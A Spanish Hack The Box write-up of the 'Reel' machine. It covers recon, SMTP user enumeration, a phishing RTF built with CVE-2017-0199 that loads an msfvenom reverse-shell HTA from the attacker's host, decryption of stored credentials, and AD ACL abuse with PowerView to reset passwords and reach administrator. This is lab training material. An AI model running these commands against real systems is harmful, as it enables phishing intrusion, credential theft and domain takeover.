---
title: "Reel"
date: 2024-07-10
draft: false
description: "Resoluciones de máquinas"
tags: ["Writeup", "HTB","Hard","Reel"]
---

## Reconocimiento

### Nmap

Escaneamos la maquina para ver que puertos tiene abiertos:

```shell
nmap -p- --open --min-rate 5000 -Pn -n 10.10.10.77
```

>Nota:

>

>**-p-**: El guion después de `-p` indica a `nmap` que debe escanear todos los puertos desde el 1 hasta el 65535

>

>**--open**: Filtra los resultados para mostrar solo los puertos abiertos, ignorando los puertos cerrados y filtrados

>

>**-sS**: El escaneo SYN es un tipo de escaneo que envía paquetes SYN y analiza las respuestas para determinar el estado de los puertos

>

>**--min-rate 5000**: Configura `nmap` para enviar al menos 5000 paquetes por segundo, acelerando el escaneo

>

>**-Pn**: Omite la etapa de ping para determinar si un host está activo, asumiendo que todos los hosts están activos. Esto es útil para escanear hosts que pueden estar configurados para no responder a pings

>

>**-n**: Evita la resolución de nombres DNS, acelerando el escaneo ya que no se espera a que se resuelvan los nombres de los hosts

```
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
25/tcp    open  smtp
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
593/tcp   open  http-rpc-epmap
49159/tcp open  unknown
```

## Explotación

### FTP

Vamos a entrar como anonymous:

```
ftp 10.10.10.77
```

Vemos 3 archivos vamos a descargar todo:

```
mget *
```

Vanos a Ver que hay en estos archivos:

`readme.txt`
```
please email me any rtf format procedures - I'll review and convert.
new format / converted documents will be saved here.
```

Vemos que podemos enviar un email a alguien con un archivo`.rtf` y lo va a mirar

`AppLocker.docx`
![](app.png)

`Windows Event Forwarding.docx`
![](error.png)

Nos dice que el fichero esta corrupto, vamos a mirar los metadatos para ver si podemos encontrar mas información sobre a quién tenemos que enviar el email:

```
┌──(fouen㉿fouen)-[~/htb/reel]
└─$ exiftool Windows\ Event\ Forwarding.docx | grep Creator
Creator                         : nico@megabank.com
```

Encontramos un email, vamos a verificar si le podemos enviar un correo

### Telnet

Vamos a conectarnos por `telnet`

```
telnet 10.10.10.77 25
```

Podemos usar `VRFY` para ver si el correo es válido:

```
VRFY 
502 VRFY disallowed.
```

Otra forma seria:

```
MAIL FROM: fouen@megabank.com
250 OK
RCPT TO: nico@megabank.com
250 OK
RCPT TO: manolo@megabank.com
550 Unknown user
```

Aquí vemos que Nico devuelve OK pero Manolo no 

Ya hemos visto que tenemos un correo válido al que le tenemos que enviar un `.rtf`.

Encontramos que hay un CVE que crea un rtf malicioso para entablar-nos una shell:

[CVE-2017-0199](https://github.com/bhdresh/CVE-2017-0199)

Este script cuando la víctima abra el `.rtf` forzará a que mande una petición a un servidor nuestro donde se encuentre un `.hta` malicioso

Para esto necesitamos crear el `.hta` malicioso, lo podemos crear con `msfvenom`:

Listamos si esta el formato `hta`:

```
┌──(fouen㉿fouen)-[~/htb/reel/CVE-2017-0199]
└─$ msfvenom  -l formats | grep hta
    hta-psh
```

Vemos que es `hta-psh`

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.10 LPORT=4444 -f hta-psh -o malicious.hta
```

Con el `.hta` creado vamos a usar el script del `CVE`:

```
python2 CVE-2017-0199/cve-2017-0199_toolkit.py -M gen -w money.rtf -u http://10.10.14.10/malicious.hta -t RTF -x 0
```

Ahora nos ponemos en escucha por el puerto 4444:

```
rlwrap nc -nlvp 4444
```

Y enviamos el email, para ello voy a usar la utilidad `sendEmail`

```
sendEmail -f fouen@megabank.com -t nico@megabank.com -u MONEY -m "Your money" -s 10.10.10.77:25 -a money.rtf
```

## Escalada de Privilegios

En el directorio Desktop encontramos un archivo `creds.xml`

```
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">                                   
  <Obj RefId="0">                                                                                                  
    <TN RefId="0">                                                                                                 
      <T>System.Management.Automation.PSCredential</T>                                                             
      <T>System.Object</T>                                                                                         
    </TN>                                                                                                          
    <ToString>System.Management.Automation.PSCredential</ToString>                                                 
    <Props>                                                                                                        
      <S N="UserName">HTB\Tom</S>                                                                                  
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692</SS>                                                                                            
    </Props>
  </Obj>
</Objs>
```

Vemos que hay un usuario y una contraseña cifrada:

Esa contraseña la podemos ver en texto claro usando herramientas como `Import-CliXml` o `Export-CliXml` hay que decir que esto se usa en `Powershell`

```
powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.getNetworkCredential() | Format-List *"
```

```
UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```

Ya teniendo estas credenciales vamos a intentar conectarnos por ssh:

```
tom@REEL C:\Users\tom>
```

Vamos a la ruta `C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors` 

Aquí encontramos un acls.csv

>`acls.csv` generalmente se refiere a un archivo que contiene información sobre las Listas de Control de Acceso

Nos lo pasamos a local para verlo mejor

```
smbserver.py acl $(pwd) -smb2support
```

```
copy acls.csv \\10.10.14.11\acl\acls.csv
```

Abrimos el archivo y vemos que noustro usuario tiene permisos de escritura sobre otro:

![](tom.png)

Podemos intentar cambiarle la contraseña:


```
Import-Module .\PowerView.ps1
```

```
Set-DomainObjectOwner -Identity claire -OwnerIdentity tom
```

Definir la acl
```
Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
```

Creamos la contraseña como una string segura
```
$NewPassword = ConvertTo-SecureString 'fouen123$!' -AsPlainText -Force
```

Y cambiamos la del usuario que queramos
```
Set-DomainUserPassword -Identity claire -AccountPassword $NewPassword 
```

Ya hemos cambiado la contraseña y nos podemos conectar como `claire`.

En el `acls.csv` vemos el permiso `WriteDacl` de claire sobre el grupo `Backup_Admins`:

![](claire.png)

Como tenemos permiso vamos a meternos al grupo:

```
net group Backup_Admins claire /add
```

Vemos los permisos sobre Administrator:
```
claire@REEL C:\Users>icacls Administrator                                                                                
Administrator NT AUTHORITY\SYSTEM:(OI)(CI)(F)                                                                                   
              HTB\Backup_Admins:(OI)(CI)(F)                                                                                     
              HTB\Administrator:(OI)(CI)(F)                                                                                     
              BUILTIN\Administrators:(OI)(CI)(F)                                                                                

Successfully processed 1 files; Failed processing 0 files
```

Vemos que sobre sobre `Backup_Admins` tenemos permisos full

Ahora nos podemos meter en el directorio de Administrador, dentro de Desktop vemos un directorio `Backup Scripts`:

Aquí dentro hay varios ficheros `.ps1`, vamos a ver si encontramos alguna credencial:

Podemos mirar mas rápido buscando por una palabra clave de esta manera:

```
dir | Select-String "Password"
```

De esta manera busca de manera recursiva sobre los ficheros mirando por la palabra clave que pongamos

Nos ha encontrado una credencial

```
Cr4ckMeIfYouC4n!
```

Vamos a probar a conectarnos como admin:

```
administrator@REEL C:\Users\Administrator>whoami                                                                                
htb\administrator
```

Ya somos root!